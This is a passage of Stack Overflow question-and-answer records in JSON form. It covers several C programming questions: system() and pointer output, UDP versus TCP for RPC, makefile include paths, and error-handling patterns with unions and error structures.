"https://www.gravatar.com/avatar/34bf4b56e66db99e1e713299fa0df413?s=128&d=identicon&r=PG&f=1", "display_name": "Geno Chen", "link": "https://stackoverflow.com/users/9035237/geno-chen"}, "edited": false, "score": 0, "creation_date": 1545825525, "post_id": 53931395, "comment_id": 94703953, "body": "@GenoChen ok! got it!"}, {"owner": {"reputation": 1, "user_id": 10522783, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/u06cN.png?s=128&g=1", "display_name": "mohamadrez&#224;", "link": "https://stackoverflow.com/users/10522783/mohamadrez%c3%a0"}, "reply_to_user": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1545826510, "post_id": 53931395, "comment_id": 94704283, "body": "@wildplasser you were right about your first comment! thx all! :)"}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 2, "creation_date": 1545827257, "post_id": 53931395, "comment_id": 94704558, "body": "The behavior described in the pre-edit question is clear evidence either that the lack of room for a null-character terminator in <code>char cmd[10] = &quot;echo hello&quot;;</code>caused a problem or there is a problem elsewhere in the program (i.e., the code fragment shown is not the source of the problem; something else is corrupting memory or otherwise breaking the program)."}], "answers": [{"tags": [], "owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "is_accepted": true, "score": 3, "last_activity_date": 1545824335, "creation_date": 1545824335, "answer_id": 53931571, "question_id": 53931395, "link": "https://stackoverflow.com/questions/53931395/system-changes-char-argument-address-in-a-function-in-c/53931571#53931571", "title": "system() changes char* argument address in a function in C", "body": "<p>Works here:</p>\n\n<hr>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint foo(char* a)\n{\n    printf(\"%p\\n\", a);\n    char cmd[] = \"echo hello\";\n    system(cmd);\n    printf(\"%p\\n\", a);\n        return 0;\n}\n\nint main(void)\n{\nfoo(\"OMG\");\nreturn 0;\n}\n</code></pre>\n\n<hr>\n\n<p>Output:</p>\n\n<hr>\n\n<pre><code>$ ./a.out\n0x400718\nhello\n0x400718\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 10522783, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/u06cN.png?s=128&g=1", "display_name": "mohamadrez&#224;", "link": "https://stackoverflow.com/users/10522783/mohamadrez%c3%a0"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 49, "favorite_count": 0, "accepted_answer_id": 53931571, "answer_count": 1, "score": -4, "last_activity_date": 1545824335, "creation_date": 1545823344, "last_edit_date": 1545824313, "question_id": 53931395, "link": "https://stackoverflow.com/questions/53931395/system-changes-char-argument-address-in-a-function-in-c", "title": "system() changes char* argument address in a function in C", "body": "<p>I have function, say:</p>\n\n<pre><code>int foo(char* a)\n{\n    printf(\"%d\\n\", (int)a);\n    char cmd[] = \"echo hello\";\n    system(cmd);\n    printf(\"%d\\n\", (int)a);\n}\n</code></pre>\n\n<p>in C code, and then I run it on linux; after doing so, I see that printf outputs are:  </p>\n\n<pre><code>274351760\n1853775725\n</code></pre>\n\n<p>I just confused so much! Any idea?! :|</p>\n"}, {"tags": ["c", "tcp", "udp", "rpc"], "comments": [{"owner": {"reputation": 4461, "user_id": 8443899, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6KX5x.jpg?s=128&g=1", "display_name": "Henok Tesfaye", "link": "https://stackoverflow.com/users/8443899/henok-tesfaye"}, "reply_to_user": {"reputation": 205167, "user_id": 4323, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/qqgFU.png?s=128&g=1", "display_name": "John Zwinck", "link": "https://stackoverflow.com/users/4323/john-zwinck"}, "edited": false, "score": 0, "creation_date": 1545824043, "post_id": 53931365, "comment_id": 94703468, "body": "Here you go @JohnZwinck."}], "answers": [{"tags": [], "owner": {"reputation": 89578, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "is_accepted": true, "score": 7, "last_activity_date": 1545826137, "creation_date": 1545826137, "answer_id": 53931924, "question_id": 53931365, "link": "https://stackoverflow.com/questions/53931365/why-is-udp-preferred-over-tcp-in-making-remote-procedure-call/53931924#53931924", "title": "Why is UDP preferred over TCP, in making remote procedure call?", "body": "<p>UDP is not generally preferred to TCP when doing remote procedure calls. In fact, most implementations of RPC technologies like CORBA, XML-RPC, SOAP, Java RMI, ... use TCP and not UDP as underlying transport. TCP is preferred here because contrary to UDP it already cares about reliability (dealing with packet loss, duplication, reordering) and can also easily and transparently handle arbitrary sized messages.</p>\n\n<p>The blog you cite refers to classic Sun-RPC as used with NFS and which was primarily used in a local network - contrary to current RPC technologies which are often used in more complex network environments. In this kind of environment and at this time (long ago) UDP offered a smaller overhead and a faster recovery from network problems than TCP since there is no initial handshake and necessary retransmits, reordering ... are in full control of the RPC layer and can be tuned to the specific use case. So while preferring UDP for specific RPC in this environment made sense it cannot be said that UDP should be preferred for any kind of RPC.</p>\n"}], "owner": {"reputation": 4461, "user_id": 8443899, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6KX5x.jpg?s=128&g=1", "display_name": "Henok Tesfaye", "link": "https://stackoverflow.com/users/8443899/henok-tesfaye"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 415, "favorite_count": 0, "accepted_answer_id": 53931924, "answer_count": 1, "score": 0, "last_activity_date": 1545826137, "creation_date": 1545823203, "last_edit_date": 1545823954, "question_id": 53931365, "link": "https://stackoverflow.com/questions/53931365/why-is-udp-preferred-over-tcp-in-making-remote-procedure-call", "title": "Why is UDP preferred over TCP, in making remote procedure call?", "body": "<p>I was reading about <code>RPC</code>. The blog, \n<a href=\"https://www.cse.iitk.ac.in/users/dheeraj/cs425/lec26.html\" rel=\"nofollow noreferrer\">https://www.cse.iitk.ac.in/users/dheeraj/cs425/lec26.html</a>, recommends to use <code>UDP</code> over <code>TCP</code>, in making remote procedure call, why is <code>UDP</code> preferred than <code>TCP</code>?</p>\n"}, {"tags": ["c", "makefile"], "comments": [{"owner": {"reputation": 894, "user_id": 5758312, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15560486f98d522b0e9a43cc60c82144?s=128&d=identicon&r=PG&f=1", "display_name": "bunglehead", "link": "https://stackoverflow.com/users/5758312/bunglehead"}, "edited": false, "score": 0, "creation_date": 1545822851, "post_id": 53931094, "comment_id": 94703066, "body": "It should be included from your .c file, then you can use &quot;gcc -I/inc&quot;. Are you sure your include files are in root of your filesystem?"}, {"owner": {"reputation": 135, "user_id": 10775509, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-Upvx0wlGOzU/AAAAAAAAAAI/AAAAAAAAATw/84UzMfwjEVc/photo.jpg?sz=128", "display_name": "HARINI NATHAN", "link": "https://stackoverflow.com/users/10775509/harini-nathan"}, "reply_to_user": {"reputation": 894, "user_id": 5758312, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15560486f98d522b0e9a43cc60c82144?s=128&d=identicon&r=PG&f=1", "display_name": "bunglehead", "link": "https://stackoverflow.com/users/5758312/bunglehead"}, "edited": false, "score": 0, "creation_date": 1545823491, "post_id": 53931094, "comment_id": 94703274, "body": "the include files are in  root of filesystem"}, {"owner": {"reputation": 894, "user_id": 5758312, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15560486f98d522b0e9a43cc60c82144?s=128&d=identicon&r=PG&f=1", "display_name": "bunglehead", "link": "https://stackoverflow.com/users/5758312/bunglehead"}, "edited": false, "score": 0, "creation_date": 1545824179, "post_id": 53931094, "comment_id": 94703507, "body": "In that case check GCC manual regarding directory search options, <a href=\"https://gcc.gnu.org/onlinedocs/gcc/Directory-Options.html#Directory-Options\" rel=\"nofollow noreferrer\">gcc.gnu.org/onlinedocs/gcc/&hellip;</a>."}], "answers": [{"tags": [], "owner": {"reputation": 464, "user_id": 2696475, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6fa3d62dda3410946b8eea5685b0f054?s=128&d=identicon&r=PG&f=1", "display_name": "FrodeTennebo", "link": "https://stackoverflow.com/users/2696475/frodetennebo"}, "is_accepted": true, "score": 0, "last_activity_date": 1545837559, "creation_date": 1545837559, "answer_id": 53933884, "question_id": 53931094, "link": "https://stackoverflow.com/questions/53931094/how-do-i-include-headers-outside-of-my-project-directory-in-makefiles/53933884#53933884", "title": "How do I include headers outside of my project directory in makefiles", "body": "<p>In the makefile change:</p>\n\n<pre><code>INC=-I/inc/stackheaders.h\n</code></pre>\n\n<p>...to:</p>\n\n<pre><code>INC=-I/inc\n</code></pre>\n\n<p>...given that the file <code>stackheaders.h</code> is in <code>/inc</code>.</p>\n"}], "owner": {"reputation": 135, "user_id": 10775509, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-Upvx0wlGOzU/AAAAAAAAAAI/AAAAAAAAATw/84UzMfwjEVc/photo.jpg?sz=128", "display_name": "HARINI NATHAN", "link": "https://stackoverflow.com/users/10775509/harini-nathan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 41, "favorite_count": 0, "accepted_answer_id": 53933884, "answer_count": 1, "score": -1, "last_activity_date": 1545837559, "creation_date": 1545821800, "last_edit_date": 1545837193, "question_id": 53931094, "link": "https://stackoverflow.com/questions/53931094/how-do-i-include-headers-outside-of-my-project-directory-in-makefiles", "title": "How do I include headers outside of my project directory in makefiles", "body": "<p>This is my makefile but the header files are not included:</p>\n\n<pre><code>CC      =gcc\n#CFLAGS  =-g\nINC=-I/inc/stackheaders.h\nOBJFILES= main.o fileOperations.o stackOperations.o\nHEADERS = inc/stackheaders.h\n\nTARGET  = stacktest\nall: $(TARGET)\n$(TARGET): $(OBJFILES)\n    $(CC) $(INC)-o $(TARGET) $(OBJFILES) \nclean:\n    rm -f $(OBJFILES) $(TARGET) \n</code></pre>\n\n<p>The error I get is:</p>\n\n<pre><code>gcc    -c -o main.o main.c\nmain.c:1:26: fatal error: stackheaders.h: No such file or directory\ncompilation terminated.\n&lt;builtin&gt;: recipe for target 'main.o' failed\nmake: *** [main.o] Error 1\n</code></pre>\n"}, {"tags": ["c", "scala", "unions", "either"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1545821418, "post_id": 53930980, "comment_id": 94702540, "body": "It seem you should be using <i>structures</i> instead of unions. In a C union, only <i>one single</i> member can be &quot;active&quot;. And because C and Scala are so different, you might want to reconsider your design, because one design doesn&#39;t really fit all languages."}, {"owner": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1545821892, "post_id": 53930980, "comment_id": 94702708, "body": "@Someprogrammerdude <i>In a C union, only one single member can be &quot;active&quot;</i>. That&#39;s why I&#39;m asking... For this particular circumstance file descriptor either valid (in this case I will make the <code>int</code> field active) or invalid (in this case I will make <code>error_message</code> active). Does it look weird in C?"}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1545822002, "post_id": 53930980, "comment_id": 94702748, "body": "Are you asking about using a tag to tell how a union shall be used? If so then &quot;yes, that&#39;s conventional&quot;"}, {"owner": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "reply_to_user": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1545822092, "post_id": 53930980, "comment_id": 94702777, "body": "@4386427 Well, I will be relying on the <code>const enum type type</code> value to tell if the union contains a valid file descriptor or an error message string."}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1545822277, "post_id": 53930980, "comment_id": 94702853, "body": "Maybe this is relevant for you <a href=\"https://en.wikipedia.org/wiki/Tagged_union\" rel=\"nofollow noreferrer\">en.wikipedia.org/wiki/Tagged_union</a>"}], "answers": [{"comments": [{"owner": {"reputation": 7709, "user_id": 2093695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/6V1PZ.jpg?s=128&g=1", "display_name": "Brian McCutchon", "link": "https://stackoverflow.com/users/2093695/brian-mccutchon"}, "edited": false, "score": 0, "creation_date": 1545892470, "post_id": 53931245, "comment_id": 94720708, "body": "These approaches have the disadvantage that it&#39;s easy to forget to check the error code, silently ignoring the error, whereas a union-based approach forces you to check."}, {"owner": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "reply_to_user": {"reputation": 7709, "user_id": 2093695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/6V1PZ.jpg?s=128&g=1", "display_name": "Brian McCutchon", "link": "https://stackoverflow.com/users/2093695/brian-mccutchon"}, "edited": false, "score": 1, "creation_date": 1545892633, "post_id": 53931245, "comment_id": 94720752, "body": "@BrianMcCutchon: Does it (force you to check)? No, I don&#39;t think so.  Developers who assume success will simply assume success either way.  Instead of checking the tag (identifying which member of the union is valid), they&#39;ll just use the member of the union directly."}, {"owner": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "reply_to_user": {"reputation": 7709, "user_id": 2093695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/6V1PZ.jpg?s=128&g=1", "display_name": "Brian McCutchon", "link": "https://stackoverflow.com/users/2093695/brian-mccutchon"}, "edited": false, "score": 1, "creation_date": 1545892838, "post_id": 53931245, "comment_id": 94720821, "body": "@BrianMcCutchon: Perhaps it is better to think of it this way: C does nothing to stop you from shooting yourself in the butt.  It may sound harsh and unfriendly, but it turns out to be one of its major strengths. (It also means that buffer overruns and off-by-one errors are more prevalent than in other programming languages.  On the other hand, it keeps the runtime light, and makes it easy and simple to interface to other programming languages.)  The responsibility to write sensible code is completely upon the human programmer.  I advocate making that easy/easier, but not enforcing it."}, {"owner": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "edited": false, "score": 1, "creation_date": 1545980314, "post_id": 53931245, "comment_id": 94747726, "body": "I have a question about object allocation. Suppose I defined opaque <code>struct my_struct_t</code> and a function for its initialization/releasing <code>struct my_struct_t *initialize(int);</code>, <code>int release(struct my_struct_t*);</code>. Is it a common/good practice to return a <code>NULL</code> pointer in case initialization failed for some reason? In case of trying to release <code>NULL</code> -- to return an appropriate error code?"}, {"owner": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "reply_to_user": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "edited": false, "score": 0, "creation_date": 1545981284, "post_id": 53931245, "comment_id": 94747991, "body": "@SomeName: Returning <code>NULL</code> in case of an error is expected; see e.g. <code>malloc()</code>, <code>calloc()</code>, <code>realloc()</code>. Releasing/freeing <code>NULL</code> is usually safe and a no-op; see e.g. <code>free()</code>. In particular, <code>free(NULL)</code> is safe and does nothing."}, {"owner": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "reply_to_user": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "edited": false, "score": 0, "creation_date": 1545981453, "post_id": 53931245, "comment_id": 94748034, "body": "@SomeName: However, I would advise against an opaque structure, and instead use an initializer macro, <code>MY_STRUCT_INITIALIZER</code>, so that an error structure can be declared and initialized in one line using <code>struct my_struct foo = MY_STRUCT_INITIALIZER;</code>. This is used in e.g. pthread mutexes and condition variables (<code>PTHREAD_MUTEX_INITIALIZER</code> and <code>PTHREAD_COND_INITIALIZER</code>), and it does make the code simpler and shorter to write."}, {"owner": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "edited": false, "score": 1, "creation_date": 1545986329, "post_id": 53931245, "comment_id": 94749458, "body": "@NominalAnimal You mean sort of initialiser macro function with a parameter (<code>int</code> in my case)? Actually in my case the only intention to use the opaque struct was to abstract over OS-specific details. So I can build a static library for each OS with its own definition of <code>struct my_struct</code>. Is it abusing of opaque <code>struct</code>s?"}, {"owner": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "reply_to_user": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "edited": false, "score": 1, "creation_date": 1545987815, "post_id": 53931245, "comment_id": 94749916, "body": "@SomeName: No, I meant for those using your library to initialize the error structure to a &quot;no error&quot; state. You can hide the OS-specific details in the header file, with <code>#if defined(_WIN32)</code> .. <code>#elif defined(__linux__)</code> .. <code>#elif defined(__APPLE__) &amp;&amp; defined(__MACH__)</code> .. <code>#elif defined(__FreeBSD__)</code> .. <code>#else #error Unsupported operating system! #endif</code> or similar, so the same header file is used on all OSes; see <a href=\"https://sourceforge.net/p/predef/wiki/Home/\" rel=\"nofollow noreferrer\">Pre-defined Compiler Macros</a> for details."}, {"owner": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "edited": false, "score": 1, "creation_date": 1546059229, "post_id": 53931245, "comment_id": 94771364, "body": "It&#39;s interesting about the <code>typedef struct errordesc</code> that you mentioned. Would it look natural if we have a linked list of such <code>errordesc</code>s instead so we can have the whole error cause trace. Or this is not really common to do in C?"}, {"owner": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "reply_to_user": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "edited": false, "score": 1, "creation_date": 1546078151, "post_id": 53931245, "comment_id": 94774734, "body": "@SomeName: I would recommend against a linked list, because you might fail to report an error if there is a problem with memory management/allocation.  I added a section about error reporting and management that hopefully clears some of the questions you posed; do let me know if you need more detailed advice. I do believe this is useful for others pondering error handling, and that we can do better than is currently typically done, so this is an important/useful/practical topic to work on."}, {"owner": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "edited": false, "score": 0, "creation_date": 1546602885, "post_id": 53931245, "comment_id": 94912060, "body": "@NominalAnimal I have one more question regarding <code>struct errordesc</code>. Would it look common to make an error parameter type to be  <code>struct errordesc **</code>? In such a case we could pass a pointer to a null pointer initially and in case of error condition we can assign a pointer to an actual error. Why I think it can be useful is 1. Error can be easily propagated down the call stack (we have <code>struct errordesc **</code>). 2. We can make <code>struct errordesc</code> immutable."}, {"owner": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "reply_to_user": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "edited": false, "score": 0, "creation_date": 1546614578, "post_id": 53931245, "comment_id": 94918014, "body": "@SomeName: Not common, but not odd either; more like &quot;oh okay, there must be a good reason for doing it like that&quot;. If you really need error stacks like that, then yes, that is how you&#39;d do it. (Put the <code>struct errordesc *next</code> as the first element in the structure.) However, like I wrote above, I have never found error stacks to be practical, as only the root error tends to be significant. (When one thing goes wrong, things tend to avalance from there; with only the root cause being important.) I do not see any extra value in having the structure immutable."}, {"owner": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "reply_to_user": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "edited": false, "score": 1, "creation_date": 1546614830, "post_id": 53931245, "comment_id": 94918153, "body": "@SomeName: Consider Java stack traces as an example. They are often several thousand characters long. For what? Usually, the problem is obvious when you look at the root problem: something was a null reference, or an out-of-bound index, and to solve the bug, <i>you think how that could happen</i>. The rest of the stack trace is basically useless. In those rare cases where you <i>do</i> need a stack trace, you can run the executable in a debugger, duplicate the error and get a core dump (snapshot of the process at the point of error), and examine the entire state till your heart is content."}], "tags": [], "owner": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "is_accepted": true, "score": 5, "last_activity_date": 1546078505, "last_edit_date": 1546078505, "creation_date": 1545822546, "answer_id": 53931245, "question_id": 53930980, "link": "https://stackoverflow.com/questions/53930980/handle-errors-with-union/53931245#53931245", "title": "Handle errors with union", "body": "<blockquote>\n  <p>I'm not sure if it is sort of conventional to make use of union for error handling.</p>\n</blockquote>\n\n<p>No, it is not.  I would heavily discourage against it, because as you can see, it generates a lot of code for something that should be really simple.</p>\n\n<p>There are several much more common patterns.  When the function operates on a structure, it is much more common to use</p>\n\n<pre><code>int operation(struct something *reference, ...);\n</code></pre>\n\n<p>which takes a pointer to the structure to be operated on, and returns 0 if success, and an error code otherwise (or -1 with <code>errno</code> set to indicate the error).</p>\n\n<p>If the function returns a pointer, or you need an interface to report complex errors, you can use a structure to describe your errors, and have the operations take an extra pointer to such a structure:</p>\n\n<pre><code>typedef struct {\n    int         errnum;\n    const char *errmsg;\n} errordesc;\n\nstruct foo *operation(..., errordesc *err);\n</code></pre>\n\n<p>Typically, the operation only modifies the error structure when an error does occur; it does not clear it. This allows you to easily \"propagate\" errors across multiple levels of function calls to the original caller, although the original caller must clear the error structure first.</p>\n\n<p>You'll find that one of these approaches will map to whatever other language you wish to create bindings for quite nicely.</p>\n\n<hr>\n\n<p>OP posed several followup questions in the comment chain that I believe are useful for other programmers (especially those writing bindings for routines in different programming languages), so I think a bit of elaboration on the practical handling of errors in in order.</p>\n\n<p>First thing to realize regarding errors is that in practice, we divide them into two categories: <em>recoverable</em>, and <em>unrecoverable</em>:</p>\n\n<ul>\n<li><p>Recoverable errors are those that can be ignored (or worked around).</p>\n\n<p>For example, if you have a graphical user interface, or a game, and an error occurs when you try to play an audio event (say, completion \"ping!\"), that obviously should not cause the entire application to abort.</p></li>\n<li><p>Unrecoverable errors are those serious enough to warrant the application (or per-client thread in a service daemon) to exit.</p>\n\n<p>For example, if you have a graphical user interface or a game, and it runs out of memory while constructing the initial window/screen, there is not much else it can sanely do but abort and log an error.</p></li>\n</ul>\n\n<p>Unfortunately, the functions themselves usually <strong>cannot</strong> differentiate between the two: it is up to the caller to make the decision.</p>\n\n<p>Therefore, the primary purpose of an error indicator is to provide enough information to the caller to make that decision.</p>\n\n<p>A secondary purpose is to provide enough information to the human user (and developers), to make the determination whether the error is a software issue (a bug in the code itself), indicative of a hardware problem, or something else.</p>\n\n<p>For example, when using POSIX low-level I/O (<a href=\"http://man7.org/linux/man-pages/man2/read.2.html\" rel=\"nofollow noreferrer\"><code>read()</code></a>, <a href=\"http://man7.org/linux/man-pages/man2/write.2.html\" rel=\"nofollow noreferrer\"><code>write()</code></a>), the functions can be interrupted by the delivery of a <a href=\"http://man7.org/linux/man-pages/man7/signal.7.html\" rel=\"nofollow noreferrer\">signal</a> to a signal handler installed without the <a href=\"http://man7.org/linux/man-pages/man2/sigaction.2.html\" rel=\"nofollow noreferrer\"><code>SA_RESTART</code></a> flag using that particular thread. In that case, the function will return a short count (less than requested data read/written), or -1 with <code>errno == EINTR</code>.</p>\n\n<p>In most cases, that EINTR error can be safely ignored, and the read()/write() call repeated.  However, the easiest way to implement an I/O timeout in POSIX C is by using exactly that kind of a interrupt. So, if we write an I/O operation that ignores EINTR, it will not be affected by the typical timeout implementation; it will <a href=\"https://en.wikipedia.org/wiki/Blocking_(computing)\" rel=\"nofollow noreferrer\">block</a> or repeat forever, until it actually succeeds or fails.  Again, the function itself cannot know whether EINTR errors should be ignored or not; it is something only the caller knows.</p>\n\n<p>In practice, <a href=\"http://man7.org/linux/man-pages/man3/errno.3.html\" rel=\"nofollow noreferrer\">Linux <code>errno</code></a> or <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/errno.h.html\" rel=\"nofollow noreferrer\">POSIX <code>errno</code></a> values cover the vast majority of practical needs. (This is not a coincidence; this set covers the errors that can occur with a POSIX.1-capable standard C library functions.)</p>\n\n<p>In some cases, a custom error code, or a \"subtype\" identifier is useful. Instead of just <code>EDOM</code> for all mathematical errors, a linear algebra math library could have subtype numbers for errors like matrix dimensions being unsuitable for matrix-matrix multiplication, and so on.</p>\n\n<p>For human debugging needs, the file name, function name, and line number of the code that encountered the error would be very useful. Fortunately, these are provided as <code>__FILE__</code>, <code>__func__</code>, and <code>__LINE__</code>, respectively.</p>\n\n<p>This means that a structure similar to</p>\n\n<pre><code>typedef struct {\n    const char   *file;\n    const char   *func;\n    unsigned int  line;\n    int           errnum;  /* errno constant */\n    unsigned int  suberr;  /* subtype of errno, custom */\n} errordesc;\n#define  ERRORDESC_INIT  { NULL, NULL, 0, 0, 0 }\n</code></pre>\n\n<p>should cover the needs I personally can 